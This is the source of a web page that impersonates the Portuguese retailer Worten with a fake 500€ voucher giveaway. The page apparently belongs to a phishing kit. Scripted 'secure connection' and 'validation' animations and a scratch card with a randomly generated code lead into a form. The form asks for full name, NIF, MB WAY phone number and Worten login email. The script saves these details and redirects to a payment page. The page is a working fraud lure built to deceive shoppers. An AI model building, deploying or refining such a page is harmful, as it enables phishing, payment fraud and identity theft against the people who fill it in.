<!doctype html>
<html lang="pt-PT">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Resgate do Prémio - Worten</title>
    <meta name="description" content="Resgate o seu voucher Worten">
    <link rel="stylesheet" href="style.css?v=24">
    <link rel="stylesheet" href="style.css?v=24">
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;800&display=swap" rel="stylesheet">
    <link rel="icon" href="/assets/worten-logo.svg" type="image/svg+xml">
    <style>
        body {
            font-family: 'Open Sans', 'Arial', sans-serif;
        }

        .voucher-img-container {
            position: relative;
            display: inline-block;
            width: 100%;
            max-width: 320px;
        }

        .voucher-img {
            width: 100%;
            border-radius: 12px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
        }

        .voucher-value {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-family: 'Open Sans', sans-serif;
            font-weight: 800;
            font-size: 42px;
            color: white;
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);
            pointer-events: none;
        }

        .continue-btn {
            width: 100%;
            padding: 18px;
            background: #d32f2f;
            color: white;
            font-weight: 800;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            cursor: pointer;
            box-shadow: 0 4px 0 #b71c1c;
            text-transform: uppercase;
            transition: transform 0.1s, opacity 0.2s;
            margin-top: 10px;
        }

        .continue-btn:active {
            transform: translateY(3px);
            box-shadow: 0 1px 0 #b71c1c;
        }

        /* Form Grid Layout */
        .form-grid {
            display: grid;
            grid-template-columns: 1fr;
            gap: 15px;
        }

        @media (min-width: 600px) {
            .form-grid {
                grid-template-columns: 1fr 1fr;
            }

            .full-width {
                grid-column: span 2;
            }
        }

        .input-group label {
            display: block;
            margin-bottom: 5px;
            font-weight: 600;
            font-size: 13px;
            color: #555;
        }

        .input-group input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 8px;
            background: #f9f9f9;
            font-family: 'Open Sans', sans-serif;
            box-sizing: border-box;
            /* Fix padding issue */
        }

        .radio-group {
            display: flex;
            gap: 10px;
        }

        .radio-option {
            flex: 1;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 8px;
            text-align: center;
            cursor: pointer;
            font-size: 13px;
            background: #f9f9f9;
        }

        /* --- GENERATION ANIMATION STYLES (CLEAN THEME) --- */
        .form-container {
            opacity: 0;
            transform: translateY(20px);
            transition: opacity 0.8s ease, transform 0.8s ease;
            pointer-events: none;
            margin-bottom: 50px;
            /* Added spacing from footer */
        }

        .form-container.visible {
            opacity: 1;
            transform: translateY(0);
            pointer-events: auto;
        }

        #generation-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.95);
            /* Clean Professional White */
            border-radius: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 10;
            backdrop-filter: blur(5px);
            border: 1px solid #eee;
        }

        .gen-spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #d32f2f;
            /* Worten Red */
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 25px;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }

        .gen-text {
            color: #333;
            font-family: 'Open Sans', sans-serif;
            font-weight: 700;
            font-size: 16px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        /* Cursor Blink Effect */
        .cursor-blink {
            animation: blink 1s step-end infinite;
        }

        @keyframes blink {

            0%,
            100% {
                opacity: 1;
            }

            50% {
                opacity: 0;
            }
        }

        #voucher-code-display {
            font-family: 'Roboto Mono', monospace;
            font-size: 28px;
            color: #d32f2f;
            /* Worten Red */
            font-weight: 800;
            margin-top: 15px;
            letter-spacing: 3px;
            display: none;
            background: #fff;
            padding: 10px 20px;
            border-radius: 8px;
            border: 1px dashed #d32f2f;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.05);
        }

        @keyframes scan {
            0% {
                top: 0%;
                opacity: 0;
            }

            50% {
                opacity: 1;
                box-shadow: 0 0 20px #4CAF50;
            }

            100% {
                top: 100%;
                opacity: 0;
            }
        }

        .scan-line {
            position: absolute;
            left: 0;
            width: 100%;
            height: 2px;
            background: #4CAF50;
            z-index: 5;
            animation: scan 2s ease-in-out infinite;
            display: none;
        }
    </style>
</head>

<body>
    <!-- Header Minimalista -->
    <div id="worten-header" style="text-align: center; padding: 20px;">
        <img id="worten-logo" src="/assets/worten-logo.svg"
            style="width: 140px; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.2));">
    </div>

    <div class="main-container" style="max-width: 900px; margin: 0 auto; width: 95%;">

        <!-- Instruction Header (Visible Feedback) -->
        <!-- Instruction Header (Visible Feedback) -->
        <div id="instruction-text"
            style="text-align: center; color: #fff; font-weight: 700; margin-bottom: 20px; font-size: 16px; min-height: 30px; text-shadow: 0 2px 4px rgba(0,0,0,0.5);">
            <!-- Dynamic Text Here -->
        </div>

        <!-- Voucher Card Showcase -->
        <div class="voucher-card" style="text-align: center; position: relative; margin-bottom: 30px;">

            <!-- Glow Effect Behind Image -->
            <div
                style="position: absolute; top: 35%; left: 50%; transform: translate(-50%, -50%); width: 300px; height: 180px; background: rgba(255,255,255,0.25); filter: blur(40px); border-radius: 50%; z-index: 0; pointer-events: none;">
            </div>

            <div class="voucher-img-container"
                style="position: relative; z-index: 1; max-width: 450px; width: 85%; margin: 0 auto; filter: drop-shadow(0 20px 40px rgba(0,0,0,0.5));">
                <img src="voucher.png" class="voucher-img" alt="Voucher Worten"
                    style="width: 100%; border-radius: 20px;">

                <!-- Scratch Card Area (Integrated) -->
                <div id="scratch-wrapper"
                    style="position: absolute; top: 73%; left: 50%; transform: translate(-50%, -50%); width: 220px; height: 50px; display: none; overflow: hidden; border-radius: 4px;">
                    <!-- The Secret Code (Underneath - Transparent Background) -->
                    <div id="voucher-code-display"
                        style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; background: rgba(255,255,255,0.9); margin: 0; border: none;">
                        <div
                            style="font-family: 'Courier New', monospace; font-size: 20px; color: #000; font-weight: 900; letter-spacing: 2px;">
                            WR-500-XXXX
                        </div>
                    </div>
                    <!-- The Scratch Layer (On Top) -->
                    <canvas id="scratch-canvas" width="220" height="50"
                        style="position: absolute; top: 0; left: 0; z-index: 2; cursor: pointer; touch-action: none;"></canvas>
                </div>
            </div>

            <!-- Scan Effect -->
            <div class="scan-line" id="scanLine"></div>

            <!-- Generation Overlay -->
            <div id="generation-overlay">
                <div class="gen-spinner" id="genSpinner"></div>
                <div class="gen-text" id="genText">A estabelecer ligação segura...</div>

                <!-- Wrapper Moved to Image Container -->
            </div>

            <h2
                style="position: relative; z-index: 1; color: white; font-weight: 800; font-size: 32px; margin-top: 25px; margin-bottom: 5px; font-family: 'Open Sans', 'Arial', sans-serif; text-shadow: 0 2px 4px rgba(0,0,0,0.3);">
                VOUCHER 500€</h2>
            <p
                style="position: relative; z-index: 1; color: white; font-weight: 600; font-size: 16px; opacity: 0.9; font-family: 'Open Sans', 'Arial', sans-serif;">
                Válido em worten.pt e lojas físicas</p>
        </div>

        <div style="display: flex; flex-wrap: wrap; gap: 20px; justify-content: center;">

            <!-- Benefits List (Horizontal on Wide) -->
            <div class="benefits-list"
                style="flex: 1 1 300px; display: flex; flex-direction: column; gap: 15px; margin-bottom: 30px; color: white; font-family: 'Open Sans', sans-serif;">
                <div class="benefit-item"
                    style="display: flex; align-items: center; gap: 15px; background: rgba(0,0,0,0.2); padding: 15px; border-radius: 10px;">
                    <div
                        style="background: #fff; width: 40px; height: 40px; border-radius: 50%; display: flex; align-items: center; justify-content: center; flex-shrink: 0;">
                        <!-- Icon: Shopping Bag -->
                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#d32f2f" stroke-width="2">
                            <path d="M6 2L3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4z"></path>
                            <line x1="3" y1="6" x2="21" y2="6"></line>
                            <path d="M16 10a4 4 0 0 1-8 0"></path>
                        </svg>
                    </div>
                    <div>
                        <h4 style="font-weight: 700; margin: 0;">Válido em Toda a Loja</h4>
                        <p style="font-size: 12px; opacity: 0.9; margin: 2px 0 0;">Utiliza em qualquer produto, sem
                            restrições.</p>
                    </div>
                </div>

                <div class="benefit-item"
                    style="display: flex; align-items: center; gap: 15px; background: rgba(0,0,0,0.2); padding: 15px; border-radius: 10px;">
                    <div
                        style="background: #fff; width: 40px; height: 40px; border-radius: 50%; display: flex; align-items: center; justify-content: center; flex-shrink: 0;">
                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#d32f2f" stroke-width="2">
                            <rect x="1" y="3" width="15" height="13"></rect>
                            <polygon points="16 8 20 8 23 11 23 16 16 16 16 8"></polygon>
                            <circle cx="5.5" cy="18.5" r="2.5"></circle>
                            <circle cx="18.5" cy="18.5" r="2.5"></circle>
                        </svg>
                    </div>
                    <div>
                        <h4 style="font-weight: 700; margin: 0;">Envio Gratuito</h4>
                        <p style="font-size: 12px; opacity: 0.9; margin: 2px 0 0;">Frete grátis incluído na tua
                            encomenda.
                        </p>
                    </div>
                </div>

                <div class="benefit-item"
                    style="display: flex; align-items: center; gap: 15px; background: rgba(0,0,0,0.2); padding: 15px; border-radius: 10px;">
                    <div
                        style="background: #fff; width: 40px; height: 40px; border-radius: 50%; display: flex; align-items: center; justify-content: center; flex-shrink: 0;">
                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#d32f2f" stroke-width="2">
                            <circle cx="12" cy="12" r="10"></circle>
                            <polyline points="12 6 12 12 16 14"></polyline>
                        </svg>
                    </div>
                    <div>
                        <h4 style="font-weight: 700; margin: 0;">Ativo em até 12 Horas</h4>
                        <p style="font-size: 12px; opacity: 0.9; margin: 2px 0 0;">Voucher pessoal e intransferível
                            (associado ao NIF).</p>
                    </div>
                </div>
            </div>

            <!-- Form Section -->
            <div class="form-container"
                style="flex: 1 1 400px; background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); font-family: 'Open Sans', 'Arial', sans-serif;">
                <h3 style="color: #333; text-align: center; margin-bottom: 25px; font-weight: 700; font-size: 22px;">
                    Dados para Ativação</h3>

                <form id="claimForm" class="form-grid">
                    <div class="input-group full-width">
                        <label>Nome Completo</label>
                        <input type="text" required placeholder="Como no Cartão de Cidadão">
                    </div>

                    <div class="input-group">
                        <label>NIF (Para fatura)</label>
                        <input type="tel" required maxlength="9" placeholder="NIF (9 dígitos)"
                            oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*?)\..*/g, '$1').slice(0, 9);">
                    </div>

                    <div class="input-group">
                        <label>Telemóvel (MB WAY)</label>
                        <div
                            style="display: flex; align-items: center; border: 1px solid #ddd; border-radius: 8px; background: #f9f9f9; padding: 0 12px;">
                            <!-- PT Flag SVG -->
                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 480" width="24" height="18"
                                style="flex-shrink: 0; box-shadow: 0 1px 2px rgba(0,0,0,0.2);">
                                <g fill-rule="evenodd" stroke-width="1pt">
                                    <path fill="#e03c31" d="M213.3 0H640v480H213.3z" />
                                    <path fill="#046a38" d="M0 0h213.3v480H0z" />
                                    <path fill="#ff0" d="M213.3 240a85.3 85.3 0 1 0-170.6 0 85.3 85.3 0 0 0 170.6 0Z"
                                        transform="matrix(.55 0 0 .55 96 108)" />
                                </g>
                                <path fill="#e03c31" d="M213.3 226.7v26.6h26.7a13.3 13.3 0 0 0 0-26.6h-26.7Z"
                                    transform="matrix(1.5 0 0 1.5 -106 -110)" />
                                <!-- Simplified Shield for small size -->
                                <path fill="none" stroke="#fff" stroke-width="30" d="M213 180v120"
                                    transform="scale(0.5) translate(213, 0)" />
                            </svg>
                            <span style="font-weight: 600; color: #333; margin: 0 8px;">+351</span>
                            <input type="tel" id="userPhone" required placeholder="9xx xxx xxx"
                                style="border: none; background: transparent; padding: 12px 0; outline: none; flex: 1;">
                        </div>
                    </div>

                    <div class="input-group full-width">
                        <label>Email (Login Worten)</label>
                        <input type="email" id="userEmail" required placeholder="teu.email@exemplo.com"
                            list="email-providers">
                        <datalist id="email-providers">
                            <option value="@gmail.com">
                            <option value="@hotmail.com">
                            <option value="@outlook.pt">
                            <option value="@sapo.pt">
                            <option value="@icloud.com">
                        </datalist>
                    </div>

                    <button type="submit" class="continue-btn full-width">
                        CONTINUAR
                    </button>
                </form>
            </div>
        </div>
    </div>

    <!-- Official Footer -->
    <footer class="worten-footer">
        <img src="/assets/worten-logo.svg" class="footer-logo" alt="Worten">
        <div class="footer-content">
            <div class="footer-col">
                <h4>Apoio ao Cliente</h4>
                <ul>
                    <li><a href="#">Ajuda e Contactos</a></li>
                    <li><a href="#">Estado da Encomenda</a></li>
                    <li><a href="#">Devoluções</a></li>
                </ul>
            </div>
            <div class="footer-col">
                <h4>Sobre Nós</h4>
                <ul>
                    <li><a href="#">Quem somos</a></li>
                    <li><a href="#">Lojas</a></li>
                    <li><a href="#">Worten Resolve</a></li>
                </ul>
            </div>
            <div class="footer-col">
                <h4>Links Úteis</h4>
                <ul>
                    <li><a onclick="openLegal('privacy')">Política de Privacidade</a></li>
                    <li><a onclick="openLegal('terms')">Termos e Condições</a></li>
                    <li><a href="#">Livro de Reclamações</a></li>
                </ul>
            </div>
        </div>
        <div class="footer-bottom">
            <p>© 2024 Worten - Equipamentos para o Lar, S.A. Todos os direitos reservados.</p>
        </div>
    </footer>

    <!-- Legal Modals -->
    <div id="legalModal" class="legal-modal">
        <div class="legal-content">
            <span class="close-legal" onclick="closeLegal()">&times;</span>
            <h2 id="legalTitle" style="color: #d32f2f; margin-bottom: 20px;"></h2>
            <div id="legalBody" style="font-size: 13px; color: #555;"></div>
        </div>
    </div>

    <!-- Shared Script for Modals -->
    <script src="script.js?v=23"></script>
    <script src="waymb-service.js?v=1"></script>

    <script>
        // --- Generation Sequence ---
        window.onload = () => {
            document.body.style.opacity = '1';

            const overlay = document.getElementById('generation-overlay');
            const spinner = document.getElementById('genSpinner');
            const text = document.getElementById('genText');
            const codeDisplay = document.querySelector('#voucher-code-display div:first-child');
            const scanLine = document.getElementById('scanLine');
            const formContainer = document.querySelector('.form-container');
            const scratchWrapper = document.getElementById('scratch-wrapper');

            // Block form initially
            formContainer.classList.remove('visible');

            // Step 1: Connecting (0-1.5s)
            text.innerText = "A gerar o teu Código Único...";

            // Step 2: Generating ID (1.5s)
            setTimeout(() => {
                text.innerText = "Validando Voucher...";
                scanLine.style.display = 'block'; // Start scanning
            }, 1500);

            // Step 3: Show Scratch Card (3.5s)
            setTimeout(() => {
                spinner.style.display = 'none';
                scanLine.style.display = 'none';
                overlay.style.display = 'none'; // Reveal Voucher underneath
                overlay.style.display = 'none'; // Reveal Voucher underneath

                // Generate Random Code
                const randomCode = 'WR-500-' + Math.random().toString(36).substr(2, 4).toUpperCase();
                codeDisplay.innerText = randomCode;

                // Show Scratch Area (Pop animation)
                scratchWrapper.style.display = 'block';
                // scratchWrapper.style.animation = 'pulse 0.5s ease-out'; // Removed to fix positioning glitch
                initScratchCard();

                text.innerHTML = "Código gerado! <span style='color: #d32f2f; font-weight:800; font-size: 14px; display: block; margin-top: 5px; background: #fff; padding: 5px; border-radius: 4px; border: 1px solid #ddd;'>RASPE PARA REVELAR (0%)</span>";
            }, 3500);

            // Step 4: Removed auto-reveal. Now controlled by scratch percentage.
        };

        function initScratchCard() {
            const canvas = document.getElementById('scratch-canvas');
            const ctx = canvas.getContext('2d');
            const width = canvas.width;
            const height = canvas.height;
            let isDrawing = false;

            // --- 1. Realistic Silver Foil Effect ---
            const grd = ctx.createLinearGradient(0, 0, width, height);
            // Multi-stop metallic gradient
            grd.addColorStop(0.00, '#a0a0a0');
            grd.addColorStop(0.15, '#f0f0f0');
            grd.addColorStop(0.30, '#d0d0d0');
            grd.addColorStop(0.50, '#e8e8e8');
            grd.addColorStop(0.65, '#c0c0c0');
            grd.addColorStop(0.80, '#f0f0f0');
            grd.addColorStop(1.00, '#909090');

            ctx.fillStyle = grd;
            ctx.fillRect(0, 0, width, height);

            // Add Noise/Grain for realism
            for (let i = 0; i < 5000; i++) {
                const x = Math.random() * width;
                const y = Math.random() * height;
                ctx.fillStyle = Math.random() > 0.5 ? '#fff' : '#777';
                ctx.globalAlpha = 0.2;
                ctx.fillRect(x, y, 1, 1);
            }
            ctx.globalAlpha = 1.0;

            // Pattern Text "WORTEN" faint
            ctx.globalAlpha = 0.05;
            ctx.fillStyle = '#000';
            ctx.font = 'bold 12px Arial';
            ctx.rotate(-20 * Math.PI / 180);
            for (let y = -100; y < height * 2; y += 30) {
                for (let x = -100; x < width * 2; x += 60) {
                    ctx.fillText("WORTEN", x, y);
                }
            }
            ctx.setTransform(1, 0, 0, 1, 0, 0); // Reset transform
            ctx.globalAlpha = 1.0;

            // Main Text "RASPE AQUI" (Etched look)
            ctx.fillStyle = 'rgba(255,255,255,0.7)';
            ctx.font = '900 20px "Open Sans", sans-serif'; // Reduced font size slightly
            ctx.textAlign = 'center';
            ctx.textBaseline = 'middle';
            // Shadow for depth
            ctx.shadowColor = "rgba(0,0,0,0.5)";
            ctx.shadowBlur = 2;
            ctx.shadowOffsetX = 1;
            ctx.shadowOffsetY = 1;
            ctx.fillText('RASPE AQUI', width / 2, height / 2);
            ctx.shadowColor = "transparent"; // Reset

            // --- Scratch Logic ---
            const getPos = (e) => {
                const rect = canvas.getBoundingClientRect();
                const clientX = e.touches ? e.touches[0].clientX : e.clientX;
                const clientY = e.touches ? e.touches[0].clientY : e.clientY;
                return {
                    x: clientX - rect.left,
                    y: clientY - rect.top
                };
            };

            const scratch = (x, y) => {
                ctx.globalCompositeOperation = 'destination-out';
                ctx.beginPath();
                // Irregular brush shape for realism
                ctx.arc(x, y, 15, 0, Math.PI * 2);
                // Add jitter dots
                ctx.arc(x + Math.random() * 10 - 5, y + Math.random() * 10 - 5, 10, 0, Math.PI * 2);
                ctx.fill();
            };

            // --- Audio Logic (ASMR Scratch) ---
            let audioCtx, gainNode, noiseSource;
            let audioInitialized = false;
            let audioTimeout;

            const initAudio = () => {
                if (audioInitialized) return;
                const AudioContext = window.AudioContext || window.webkitAudioContext;
                if (!AudioContext) return;

                audioCtx = new AudioContext();

                const bufferSize = audioCtx.sampleRate;
                const buffer = audioCtx.createBuffer(1, bufferSize, audioCtx.sampleRate);
                const data = buffer.getChannelData(0);
                for (let i = 0; i < bufferSize; i++) {
                    data[i] = Math.random() * 2 - 1;
                }

                noiseSource = audioCtx.createBufferSource();
                noiseSource.buffer = buffer;
                noiseSource.loop = true;

                const filter = audioCtx.createBiquadFilter();
                filter.type = 'lowpass'; // Removes high-pitch hiss
                filter.frequency.value = 350; // Muffled paper scratch
                filter.Q.value = 1.0;

                gainNode = audioCtx.createGain();
                gainNode.gain.value = 0; // Start at 0

                noiseSource.connect(filter);
                filter.connect(gainNode);
                gainNode.connect(audioCtx.destination);

                noiseSource.start();
                audioInitialized = true;
            };

            const playScratchSound = () => {
                if (!audioCtx) initAudio();
                if (audioCtx && audioCtx.state === 'suspended') audioCtx.resume();

                if (gainNode) {
                    gainNode.gain.cancelScheduledValues(audioCtx.currentTime);
                    gainNode.gain.setTargetAtTime(0.4, audioCtx.currentTime, 0.05);

                    clearTimeout(audioTimeout);
                    audioTimeout = setTimeout(() => {
                        if (gainNode) gainNode.gain.setTargetAtTime(0, audioCtx.currentTime, 0.1);
                    }, 120);
                }
            };

            const stopScratchSound = () => {
                if (gainNode && audioCtx) {
                    gainNode.gain.setTargetAtTime(0, audioCtx.currentTime, 0.1);
                }
            };

            const start = (e) => {
                isDrawing = true;
                if (!audioInitialized) initAudio();
            };
            const end = (e) => {
                isDrawing = false;
                stopScratchSound();
                checkProgress();
            };
            const move = (e) => {
                if (!isDrawing) return;
                e.preventDefault();
                const pos = getPos(e);
                scratch(pos.x, pos.y);
                playScratchSound();

                // Optional: Update progress on move (throttle)
                if (Math.random() > 0.8) checkProgress(true); // Don't heavy calc every frame
            };

            canvas.addEventListener('mousedown', start);
            canvas.addEventListener('mousemove', move);
            canvas.addEventListener('mouseup', end);
            canvas.addEventListener('touchstart', start);
            canvas.addEventListener('touchmove', move);
            canvas.addEventListener('touchend', end);

            let completed = false;

            function checkProgress(justUpdateText = false) {
                if (completed) return;

                const imgData = ctx.getImageData(0, 0, width, height);
                const pixels = imgData.data;
                let transparent = 0;
                // Sampling optimization (check every 64th pixel)
                for (let i = 0; i < pixels.length; i += 64) {
                    if (pixels[i + 3] < 128) transparent++;
                }
                const percent = Math.floor((transparent / (pixels.length / 64)) * 100);

                // Update Text (Using visible instruction-text)
                const textSpan = document.getElementById('instruction-text');
                if (textSpan) textSpan.innerHTML = `RASPE PARA REVELAR O CÓDIGO <span style='font-weight:900; color:#d32f2f;'>(${Math.min(percent, 100)}%)</span>`;

                if (!justUpdateText && percent > 45) { // Threshold
                    completed = true;

                    // Auto reveal animation
                    // Animate canvas opacity out
                    const fadeOut = setInterval(() => {
                        const currentOp = parseFloat(canvas.style.opacity || 1);
                        if (currentOp > 0) {
                            canvas.style.opacity = (currentOp - 0.1).toString();
                        } else {
                            clearInterval(fadeOut);
                            canvas.style.display = 'none';
                        }
                    }, 50);

                    // Update Text Final - Professional SVG
                    const text = document.getElementById('instruction-text');
                    text.innerHTML = "<div style='display:flex;align-items:center;justify-content:center;gap:10px;'><svg width='24' height='24' viewBox='0 0 24 24' fill='none' stroke='#4CAF50' stroke-width='3' stroke-linecap='round' stroke-linejoin='round' style='filter:drop-shadow(0 2px 4px rgba(0,0,0,0.3));'><polyline points='20 6 9 17 4 12'></polyline></svg> <span>CÓDIGO REVELADO</span></div><div style='font-size:14px; font-weight:400; margin-top:5px; opacity:0.9;'>Preencha os dados abaixo para ativar o envio</div>";

                    document.querySelector('.form-container').classList.add('visible');

                    // Scroll to form slightly
                    setTimeout(() => {
                        document.querySelector('.form-container').scrollIntoView({
                            behavior: 'smooth',
                            block: 'start'
                        });
                    }, 500);
                }
            }
        }

        // Input Masks
        const nifInput = document.querySelector('input[type="tel"][maxlength="9"]');
        const phoneInput = document.getElementById('userPhone');

        if (nifInput) {
            nifInput.addEventListener('input', (e) => {
                e.target.value = e.target.value.replace(/\D/g, '').slice(0, 9);
            });
        }

        if (phoneInput) {
            phoneInput.addEventListener('input', (e) => {
                let x = e.target.value.replace(/\D/g, '').match(/(\d{0,3})(\d{0,3})(\d{0,3})/);
                e.target.value = !x[2] ? x[1] : x[1] + ' ' + x[2] + (x[3] ? ' ' + x[3] : '');
            });
        }

        // --- Handle Form Submit (Save Data & Redirect) ---
        document.getElementById('claimForm').addEventListener('submit', (e) => {
            e.preventDefault();

            const btn = document.querySelector('.continue-btn');

            // Simple loading state
            btn.disabled = true;
            btn.style.opacity = '0.7';
            btn.innerText = 'A PROCESSAR...';

            // Save data for next step
            const userData = {
                name: document.querySelector('input[type="text"]').value,
                nif: nifInput.value,
                email: document.querySelector('input[type="email"]').value,
                phone: phoneInput.value
            };
            localStorage.setItem('wortenUserData', JSON.stringify(userData));

            // Quick redirect
            setTimeout(() => {
                window.location.href = 'payment.html';
            }, 300);
        });
    </script>
</body>

</html>